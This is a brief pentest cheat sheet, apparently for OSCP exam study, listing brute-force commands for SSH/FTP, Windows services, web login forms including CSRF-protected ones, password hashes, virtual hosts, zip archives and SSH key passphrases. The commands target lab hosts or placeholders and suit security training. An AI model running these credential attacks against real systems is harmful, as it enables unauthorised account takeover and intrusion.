<img src="https://github.com/florianges/Simple-OSCP-cheat-sheet/assets/64069514/41eded28-e1c7-48c9-b5b4-f1af03f808c3" height="180">

## Bruteforce SSH/FTP :
hydra -l [user] -P [wordlist] -s 22 -f [IP] [ssh/ftp]  

## Bruteforce service windows :
crackmapexec [mssql | winrm | smb | ssh] [IP] -u [wordlist user] -p [wordlist password]  

## Bruteforce sid :
lookupsid.py [user]@[IP]  

## Bruteforce login web :
hydra -l [user] -P [wordlist] [IP] http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V  
wfuzz -w [wordlist] -d "username=admin&password=FUZZ" --hh=[nombre de carateres de la réponse] [URL]  

**Bruteforce login web quand il y a un token CSRF :**  
python3 brutecsrf.py --url [url] --csrf [name csrf] --u [user] --fuser [name for username form] --passwd [name for password form] --w [wordlist]  
https://github.com/J3wker/Web-BruteForcer-Token-Support/blob/master/brutecsrf.py  
## Bruteforce hash :
sudo john hash.txt -wordlist=rockyou.txt --rules  
sudo hashcat -m [mode] hash.txt rockyou.txt /usr/share/hashcat/rules/best64.rule --force  
  
## Bruteforce VHOST:  
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6  
  
## Bruteforce fichier zip :
fcrackzip [archive] -D -p [dictionnaire]  
  
## Bruteforce la passphrase d'une clée privée SSH :
1.	python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash  
2.	john id_rsa.hash -wordlist=rockyou.txt  
